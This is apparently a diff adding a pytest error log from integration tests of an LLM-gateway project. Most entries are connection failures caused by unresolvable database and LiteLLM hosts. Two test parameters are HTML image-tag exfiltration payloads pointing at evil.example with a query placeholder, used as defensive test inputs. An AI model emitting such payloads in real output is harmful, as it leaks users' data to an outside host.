+           ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:445: in connect
+    return _ConnectionFairy._checkout(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:1324: in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:709: in checkout
+    rec = pool._do_get()
+          ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/impl.py:301: in _do_get
+    return self._create_connection()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:386: in _create_connection
+    return _ConnectionRecord(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:671: in __init__
+    self.__connect()
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:916: in __connect
+    with util.safe_reraise():
+         ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/langhelpers.py:166: in __exit__
+    raise exc_value.with_traceback(exc_tb)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:912: in __connect
+    self.dbapi_connection = connection = pool._invoke_creator(self)
+                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/create.py:645: in connect
+    return dialect.connect(*cargs_tup, **cparams)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/default.py:869: in connect
+    return self.loaded_dbapi.connect(*cargs, **cparams)  # type: ignore[no-any-return]  # NOQA: E501
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/dialects/postgresql/psycopg.py:760: in connect
+    return await_(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:167: in await_
+    return current.parent.switch(awaitable)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:205: in greenlet_spawn
+    value = await result
+            ^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:378: in create
+    cls._handle_exception_no_connection(dbapi, error)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:409: in _handle_exception_no_connection
+    raise error.with_traceback(exc_info[2])
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:376: in create
+    connection = await connection_awaitable
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/psycopg/connection_async.py:116: in connect
+    attempts = await conninfo_attempts_async(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'host': 'postgres', 'dbname': 'ffcore_test_810981bcb86c', 'user': 'ffcore', 'password': 'dummy-not-secret-postgres', ...}
+
+    async def conninfo_attempts_async(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := get_param(params, "target_session_attrs") == "prefer-standby":
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(await _resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           sqlalchemy.exc.OperationalError: (psycopg.OperationalError) failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+E           (Background on this error at: https://sqlalche.me/e/21/e3q8)
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts_async.py:53: OperationalError
+---------------------------- Captured stderr setup -----------------------------
+2026-11-05 01:49:35,110 INFO ffcore.litellm_reconcile litellm_reconciled created=2 updated=0 deleted=0 problems=0
+------------------------------ Captured log setup ------------------------------
+INFO     ffcore.litellm_reconcile:litellm_reconcile.py:372 litellm_reconciled created=2 updated=0 deleted=0 problems=0
+_ ERROR at setup of test_08t_r2_direct_url_lines_keep_the_placeholder[<img src=//evil.example/?q={v}>] _
+
+    @contextlib.contextmanager
+    def map_httpcore_exceptions() -> Generator[None]:
+        global HTTPCORE_EXC_MAP
+        if len(HTTPCORE_EXC_MAP) == 0:
+            HTTPCORE_EXC_MAP = _load_httpcore_exceptions()
+        try:
+>           yield
+
+/opt/venv/lib/python3.12/site-packages/httpx2/_transports/default.py:98: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/opt/venv/lib/python3.12/site-packages/httpx2/_transports/default.py:245: in handle_request
+    resp = self._pool.handle_request(req)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpcore2/_sync/connection_pool.py:242: in handle_request
+    raise exc from None
+/opt/venv/lib/python3.12/site-packages/httpcore2/_sync/connection_pool.py:224: in handle_request
+    response = connection.handle_request(pool_request.request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpcore2/_sync/connection.py:94: in handle_request
+    raise exc
+/opt/venv/lib/python3.12/site-packages/httpcore2/_sync/connection.py:74: in handle_request
+    stream = self._connect(request)
+             ^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpcore2/_sync/connection.py:117: in _connect
+    stream = self._network_backend.connect_tcp(**kwargs)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpcore2/_backends/sync.py:203: in connect_tcp
+    with map_exceptions(exc_map):
+         ^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:158: in __exit__
+    self.gen.throw(value)
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+map = {<class 'TimeoutError'>: <class 'httpcore2.ConnectTimeout'>, <class 'OSError'>: <class 'httpcore2.ConnectError'>}
+
+    @contextlib.contextmanager
+    def map_exceptions(map: ExceptionMapping) -> Generator[None]:
+        try:
+            yield
+        except Exception as exc:  # noqa: PIE786
+            for from_exc, to_exc in map.items():
+                if isinstance(exc, from_exc):
+>                   raise to_exc(exc) from exc
+E                   httpcore2.ConnectError: [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/httpcore2/_exceptions.py:17: ConnectError
+
+The above exception was the direct cause of the following exception:
+
+llm_settings = Settings(deploy_profile='llmaas', inference_backend='ollama', offline=False, database_url=SecretStr('**********'), ser...flush_s=60, retention_dry_run=True, retention_audit_drop_enabled=False, retention_batch=5000, alert_service_down_s=300)
+
+    @pytest.fixture
+    def clean_litellm(llm_settings):
+        """Empty LiteLLM model list and fake provider log before the test."""
+>       for model in litellm_models(llm_settings).values():
+                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+tests/integration/litellm_support.py:74: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+tests/integration/litellm_support.py:62: in litellm_models
+    response = httpx2.get(f"{settings.litellm_url}/model/info", headers=master(settings))
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_api.py:194: in get
+    return request(
+/opt/venv/lib/python3.12/site-packages/httpx2/_api.py:108: in request
+    return client.request(
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:796: in request
+    return self.send(request, auth=auth, follow_redirects=follow_redirects)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:979: in send
+    response = self._send_handling_auth(
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:1007: in _send_handling_auth
+    response = self._send_handling_redirects(
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:1042: in _send_handling_redirects
+    response = self._send_single_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:1075: in _send_single_request
+    response = transport.handle_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_transports/default.py:244: in handle_request
+    with map_httpcore_exceptions():
+         ^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:158: in __exit__
+    self.gen.throw(value)
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+    @contextlib.contextmanager
+    def map_httpcore_exceptions() -> Generator[None]:
+        global HTTPCORE_EXC_MAP
+        if len(HTTPCORE_EXC_MAP) == 0:
+            HTTPCORE_EXC_MAP = _load_httpcore_exceptions()
+        try:
+            yield
+        except Exception as exc:
+            mapped_exc = None
+    
+            for from_exc, to_exc in HTTPCORE_EXC_MAP.items():
+                if not isinstance(exc, from_exc):
+                    continue
+                # We want to map to the most specific exception we can find.
+                # Eg if `exc` is an `httpcore2.ReadTimeout`, we want to map to
+                # `httpx2.ReadTimeout`, not just `httpx2.TimeoutException`.
+                if mapped_exc is None or issubclass(to_exc, mapped_exc):
+                    mapped_exc = to_exc
+    
+            if mapped_exc is None:  # pragma: no cover
+                raise
+    
+            message = str(exc)
+>           raise mapped_exc(message) from exc
+E           httpx2.ConnectError: [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/httpx2/_transports/default.py:115: ConnectError
+_ ERROR at setup of test_08t_r2_direct_url_lines_keep_the_placeholder[<img src\n=\n"http:evil.example/?q={v}">] _
+
+    @contextlib.contextmanager
+    def map_httpcore_exceptions() -> Generator[None]:
+        global HTTPCORE_EXC_MAP
+        if len(HTTPCORE_EXC_MAP) == 0:
+            HTTPCORE_EXC_MAP = _load_httpcore_exceptions()
+        try:
+>           yield
+
+/opt/venv/lib/python3.12/site-packages/httpx2/_transports/default.py:98: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/opt/venv/lib/python3.12/site-packages/httpx2/_transports/default.py:245: in handle_request
+    resp = self._pool.handle_request(req)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpcore2/_sync/connection_pool.py:242: in handle_request
+    raise exc from None
+/opt/venv/lib/python3.12/site-packages/httpcore2/_sync/connection_pool.py:224: in handle_request
+    response = connection.handle_request(pool_request.request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpcore2/_sync/connection.py:94: in handle_request
+    raise exc
+/opt/venv/lib/python3.12/site-packages/httpcore2/_sync/connection.py:74: in handle_request
+    stream = self._connect(request)
+             ^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpcore2/_sync/connection.py:117: in _connect
+    stream = self._network_backend.connect_tcp(**kwargs)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpcore2/_backends/sync.py:203: in connect_tcp
+    with map_exceptions(exc_map):
+         ^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:158: in __exit__
+    self.gen.throw(value)
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+map = {<class 'TimeoutError'>: <class 'httpcore2.ConnectTimeout'>, <class 'OSError'>: <class 'httpcore2.ConnectError'>}
+
+    @contextlib.contextmanager
+    def map_exceptions(map: ExceptionMapping) -> Generator[None]:
+        try:
+            yield
+        except Exception as exc:  # noqa: PIE786
+            for from_exc, to_exc in map.items():
+                if isinstance(exc, from_exc):
+>                   raise to_exc(exc) from exc
+E                   httpcore2.ConnectError: [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/httpcore2/_exceptions.py:17: ConnectError
+
+The above exception was the direct cause of the following exception:
+
+llm_settings = Settings(deploy_profile='llmaas', inference_backend='ollama', offline=False, database_url=SecretStr('**********'), ser...flush_s=60, retention_dry_run=True, retention_audit_drop_enabled=False, retention_batch=5000, alert_service_down_s=300)
+
+    @pytest.fixture
+    def clean_litellm(llm_settings):
+        """Empty LiteLLM model list and fake provider log before the test."""
+        for model in litellm_models(llm_settings).values():
+            httpx2.post(
+                f"{llm_settings.litellm_url}/model/delete",
+                headers=master(llm_settings),
+                json={"id": model["model_info"]["id"]},
+            ).raise_for_status()
+>       httpx2.post(f"{FAKE}/_reset", json={}).raise_for_status()
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+tests/integration/litellm_support.py:80: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/opt/venv/lib/python3.12/site-packages/httpx2/_api.py:303: in post
+    return request(
+/opt/venv/lib/python3.12/site-packages/httpx2/_api.py:108: in request
+    return client.request(
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:796: in request
+    return self.send(request, auth=auth, follow_redirects=follow_redirects)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:979: in send
+    response = self._send_handling_auth(
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:1007: in _send_handling_auth
+    response = self._send_handling_redirects(
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:1042: in _send_handling_redirects
+    response = self._send_single_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:1075: in _send_single_request
+    response = transport.handle_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_transports/default.py:244: in handle_request
+    with map_httpcore_exceptions():
+         ^^^^^^^^^^^^^^^^^^^^^^^^^
+/usr/local/lib/python3.12/contextlib.py:158: in __exit__
+    self.gen.throw(value)
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+    @contextlib.contextmanager
+    def map_httpcore_exceptions() -> Generator[None]:
+        global HTTPCORE_EXC_MAP
+        if len(HTTPCORE_EXC_MAP) == 0:
+            HTTPCORE_EXC_MAP = _load_httpcore_exceptions()
+        try:
+            yield
+        except Exception as exc:
+            mapped_exc = None
+    
+            for from_exc, to_exc in HTTPCORE_EXC_MAP.items():
+                if not isinstance(exc, from_exc):
+                    continue
+                # We want to map to the most specific exception we can find.
+                # Eg if `exc` is an `httpcore2.ReadTimeout`, we want to map to
+                # `httpx2.ReadTimeout`, not just `httpx2.TimeoutException`.
+                if mapped_exc is None or issubclass(to_exc, mapped_exc):
+                    mapped_exc = to_exc
+    
+            if mapped_exc is None:  # pragma: no cover
+                raise
+    
+            message = str(exc)
+>           raise mapped_exc(message) from exc
+E           httpx2.ConnectError: [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/httpx2/_transports/default.py:115: ConnectError
+_____ ERROR at setup of test_116_3_resume_after_document_delete_fails_loud _____
+
+self = <sqlalchemy.engine.base.Connection object at 0x7fec4e75dbe0>
+engine = Engine(postgresql+psycopg://ffcore:***@postgres:5432/ffcore_test_810981bcb86c)
+connection = None, _has_events = None, _allow_revalidate = True
+_allow_autobegin = True
+
+    def __init__(
+        self,
+        engine: Engine,
+        connection: Optional[PoolProxiedConnection] = None,
+        _has_events: Optional[bool] = None,
+        _allow_revalidate: bool = True,
+        _allow_autobegin: bool = True,
+    ):
+        """Construct a new Connection."""
+        self.engine = engine
+        self.dialect = dialect = engine.dialect
+    
+        if connection is None:
+            try:
+>               self._dbapi_connection = engine.raw_connection()
+                                         ^^^^^^^^^^^^^^^^^^^^^^^
+
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:149: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/base.py:3299: in raw_connection
+    return self.pool.connect()
+           ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:445: in connect
+    return _ConnectionFairy._checkout(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:1324: in _checkout
+    fairy = _ConnectionRecord.checkout(pool)
+            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:709: in checkout
+    rec = pool._do_get()
+          ^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/impl.py:301: in _do_get
+    return self._create_connection()
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:386: in _create_connection
+    return _ConnectionRecord(self)
+           ^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:671: in __init__
+    self.__connect()
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:916: in __connect
+    with util.safe_reraise():
+         ^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/langhelpers.py:166: in __exit__
+    raise exc_value.with_traceback(exc_tb)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/pool/base.py:912: in __connect
+    self.dbapi_connection = connection = pool._invoke_creator(self)
+                                         ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/create.py:645: in connect
+    return dialect.connect(*cargs_tup, **cparams)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/engine/default.py:869: in connect
+    return self.loaded_dbapi.connect(*cargs, **cparams)  # type: ignore[no-any-return]  # NOQA: E501
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/dialects/postgresql/psycopg.py:760: in connect
+    return await_(
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:167: in await_
+    return current.parent.switch(awaitable)  # type: ignore[no-any-return]
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/util/concurrency.py:205: in greenlet_spawn
+    value = await result
+            ^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:378: in create
+    cls._handle_exception_no_connection(dbapi, error)
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:409: in _handle_exception_no_connection
+    raise error.with_traceback(exc_info[2])
+/opt/venv/lib/python3.12/site-packages/sqlalchemy/connectors/asyncio.py:376: in create
+    connection = await connection_awaitable
+                 ^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/psycopg/connection_async.py:116: in connect
+    attempts = await conninfo_attempts_async(params)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+
+params = {'host': 'postgres', 'dbname': 'ffcore_test_810981bcb86c', 'user': 'ffcore', 'password': 'dummy-not-secret-postgres', ...}
+
+    async def conninfo_attempts_async(params: ConnMapping) -> list[ConnDict]:
+        """Split a set of connection params on the single attempts to perform.
+    
+        A connection param can perform more than one attempt more than one ``host``
+        is provided.
+    
+        Also perform async resolution of the hostname into hostaddr. Because a host
+        can resolve to more than one address, this can lead to yield more attempts
+        too. Raise `OperationalError` if no host could be resolved.
+    
+        Because the libpq async function doesn't honour the timeout, we need to
+        reimplement the repeated attempts.
+        """
+        last_exc = None
+        attempts = []
+        if prefer_standby := get_param(params, "target_session_attrs") == "prefer-standby":
+            params = {k: v for k, v in params.items() if k != "target_session_attrs"}
+    
+        for attempt in split_attempts(params):
+            try:
+                attempts.extend(await _resolve_hostnames(attempt))
+            except OSError as ex:
+                last_exc = e.OperationalError(
+                    f"failed to resolve host {attempt.get('host')!r}: {ex}"
+                )
+                logger.debug("%s", last_exc)
+    
+        if not attempts:
+            assert last_exc
+            # We couldn't resolve anything
+>           raise last_exc
+E           psycopg.OperationalError: failed to resolve host 'postgres': [Errno -3] Temporary failure in name resolution
+
+/opt/venv/lib/python3.12/site-packages/psycopg/_conninfo_attempts_async.py:53: OperationalError
+
+The above exception was the direct cause of the following exception:
+
+app = <fastapi.applications.FastAPI object at 0x7fede537bfb0>
+app_settings = Settings(deploy_profile='llmaas', inference_backend='ollama', offline=False, database_url=SecretStr('**********'), ser...flush_s=60, retention_dry_run=True, retention_audit_drop_enabled=False, retention_batch=5000, alert_service_down_s=300)
+database_url = 'postgresql+psycopg://ffcore:dummy-not-secret-postgres@postgres:5432/ffcore_test_810981bcb86c'
+tmp_path = PosixPath('/tmp/pytest-of-root/pytest-0/test_116_3_resume_after_docume0')
+make_user = <function make_user.<locals>.make at 0x7fec69367560>
+make_project = <function make_project.<locals>.make at 0x7fec4e79c680>
+client_factory = <function client_factory.<locals>.make at 0x7fec4e79d620>
+
+    @pytest.fixture
+    def world(app, app_settings, database_url, tmp_path, make_user, make_project, client_factory):
+        from ffcore.core.config import get_settings
+    
+        settings = app_settings.model_copy(
+            update={
+                "fake_embed": True,
+                "knowledge_storage_dir": str(tmp_path / "storage"),
+                "database_url": SecretStr(database_url),
+                "redis_url": SecretStr(os.environ["REDIS_URL"]),
+            }
+        )
+        app.dependency_overrides[get_settings] = lambda: settings
+        queue = FakeQueue()
+        app.dependency_overrides[queue_dependency] = lambda: queue
+        setup(database_url)
+        project = make_project()
+        _, admin = make_user(memberships={project: ("admin", "edit")})
+        w = {"settings": settings, "queue": queue, "project": project, "admin": client_factory(admin)}
+>       kb = w["admin"].post(_kb_url(w), json={"key": "sozlesmeler", "name": "Sözleşmeler"})
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+tests/integration/test_116_checkpoint_sources.py:76: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:1203: in post
+    return self.request(
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:518: in request
+    return super().request(
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:796: in request
+    return self.send(request, auth=auth, follow_redirects=follow_redirects)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:993: in send
+    raise exc
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:987: in send
+    response.read()
+/opt/venv/lib/python3.12/site-packages/httpx2/_models.py:877: in read
+    self._content = b"".join(self.iter_bytes())
+                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_models.py:893: in iter_bytes
+    for raw_bytes in self.iter_raw():
+                     ^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_models.py:948: in iter_raw
+    for raw_stream_bytes in self.stream:
+                            ^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/httpx2/_client.py:143: in __iter__
+    yield from self._stream
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:384: in iter_body
+    exit_stack.close()
+/usr/local/lib/python3.12/contextlib.py:618: in close
+    self.__exit__(None, None, None)
+/usr/local/lib/python3.12/contextlib.py:610: in __exit__
+    raise exc_details[1]
+/usr/local/lib/python3.12/contextlib.py:595: in __exit__
+    if cb(*exc_details):
+       ^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:399: in close_app
+    raise exception
+/opt/venv/lib/python3.12/site-packages/anyio/from_thread.py:265: in _call_func
+    retval = await retval_or_awaitable
+             ^^^^^^^^^^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/starlette/testclient.py:366: in run_app
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/applications.py:1194: in __call__
+    await super().__call__(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/applications.py:96: in __call__
+    await self.middleware_stack(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/middleware/errors.py:186: in __call__
+    raise exc
+/opt/venv/lib/python3.12/site-packages/starlette/middleware/errors.py:164: in __call__
+    await self.app(scope, receive, _send)
+/opt/venv/lib/python3.12/site-packages/fastapi/telemetry/_asgi.py:151: in __call__
+    await self.app(scope, receive, send)
+ffcore/core/logging.py:261: in __call__
+    await self.app(scope, receive, send_status)
+ffcore/api/upload_limit.py:44: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/middleware/exceptions.py:63: in __call__
+    await wrap_app_handling_exceptions(self.app, conn)(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/_exception_handler.py:53: in wrapped_app
+    raise exc
+/opt/venv/lib/python3.12/site-packages/starlette/_exception_handler.py:42: in wrapped_app
+    await app(scope, receive, sender)
+/opt/venv/lib/python3.12/site-packages/fastapi/middleware/asyncexitstack.py:18: in __call__
+    await self.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/routing.py:683: in __call__
+    await self.middleware_stack(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:2811: in app
+    await route.handle(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:1839: in handle
+    await self.original_router.handle(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:2894: in handle
+    await included_router._handle_selected(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:1850: in _handle_selected
+    await route.handle(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:1839: in handle
+    await self.original_router.handle(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:2894: in handle
+    await included_router._handle_selected(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:1865: in _handle_selected
+    await original_route.handle(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:1328: in handle
+    await effective_context.app(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:166: in app
+    await wrap_app_handling_exceptions(app, request)(scope, receive, send)
+/opt/venv/lib/python3.12/site-packages/starlette/_exception_handler.py:53: in wrapped_app
+    raise exc
+/opt/venv/lib/python3.12/site-packages/starlette/_exception_handler.py:42: in wrapped_app
+    await app(scope, receive, sender)
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:152: in app
+    response = await f(request)
+               ^^^^^^^^^^^^^^^^
+/opt/venv/lib/python3.12/site-packages/fastapi/routing.py:511: in app
+    solved_result = await solve_dependencies(
+/opt/venv/lib/python3.12/site-packages/fastapi/dependencies/utils.py:697: in solve_dependencies
+    solved_result = await solve_dependencies(
+/opt/venv/lib/python3.12/site-packages/fastapi/dependencies/utils.py:731: in solve_dependencies
+    solved = await call(**solved_result.values)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
